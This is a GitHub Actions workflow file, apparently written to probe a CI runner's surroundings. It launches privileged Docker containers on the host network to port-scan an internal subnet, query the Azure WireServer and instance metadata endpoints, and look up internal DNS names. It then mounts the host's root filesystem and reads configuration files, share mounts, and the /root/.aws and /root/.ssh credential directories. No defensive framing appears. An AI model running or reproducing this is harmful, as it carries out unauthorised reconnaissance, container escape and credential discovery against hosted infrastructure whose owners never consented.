name: i10323-netreach3
on:
  workflow_dispatch:
permissions: write-all
jobs:
  reach:
    runs-on: ubuntu-latest
    steps:
      - name: net-reach3
        shell: bash
        run: |
          set +e
          set +o pipefail
          echo "R3_START"
          echo "--- JOB netns identity ---"
          hostname; id | head -1
          echo "--- docker host netns scan ---"
          docker run --privileged --network host alpine:3.19 sh -c '
            echo "HN hostname=$(hostname) uid=$(id -u)"
            ip -4 addr 2>/dev/null | grep inet
            ip route 2>/dev/null
            echo "--- arp ---"; cat /proc/net/arp
            echo "--- scan 10.1.0.0/24 subset ---"
            for i in 1 2 3 4 5 10 20 63 100 142 151 200 207 254; do
              for p in 22 80 443 139 445 111 2049 3389 2375 8086; do
                timeout 1 sh -c "echo > /dev/tcp/10.1.0.$i/$p" 2>/dev/null && echo "OPEN 10.1.0.$i:$p"
              done
            done
            echo "SCANHN_DONE"
            echo "--- WireServer 168.63.129.16 ---"
            timeout 4 wget -q -O- "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>&1 | head -c 400; echo
            timeout 4 wget -q -O- "http://168.63.129.16/?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>&1 | head -c 400; echo
            echo "--- IMDS azure from hostnet ---"
            timeout 4 wget -q -O- "http://169.254.169.254/metadata/instance?api-version=2021-02-01" --header="Metadata:true" 2>&1 | head -c 500; echo
            echo "--- DNS via azure DNS 168.63.129.16 ---"
            for n in runner.internal metadata r2.internal mails.ucas.edu.cn; do
              echo -n "$n => "; timeout 3 nslookup "$n" 168.63.129.16 2>&1 | grep -A1 Name | head -4
            done
            echo "HN_DONE"
          ' 2>&1 | head -90
          echo "--- HOST ROOT read-only ---"
          docker run --privileged -v /:/hostro:ro alpine:3.19 sh -c '
            echo "HR hostname=$(cat /hostro/etc/hostname 2>&1)"
            echo "--- /hostro/etc/exports ---"; cat /hostro/etc/exports 2>&1 | head -5
            echo "--- /hostro/etc/fstab ---"; cat /hostro/etc/fstab 2>&1 | head -10
            echo "--- /hostro/proc/mounts share-like ---"; grep -Ei "nfs|cifs|smb|9p|virtiofs|drvfs|sshfs|//|share" /hostro/proc/mounts 2>&1 | head -15
            echo "--- /hostro/etc/samba ---"; ls -la /hostro/etc/samba 2>&1 | head -5
            echo "--- /hostro/srv /hostro/mnt /hostro/media ---"; ls -la /hostro/srv /hostro/mnt /hostro/media 2>&1 | head -20
            echo "--- /hostro/etc/hosts ---"; cat /hostro/etc/hosts 2>&1 | tail -5
            echo "--- /hostro/root/.aws /hostro/root/.ssh ---"; ls -la /hostro/root/.aws /hostro/root/.ssh 2>&1 | head -20
            echo "HR_DONE"
          ' 2>&1 | head -70
          echo "R3_END"
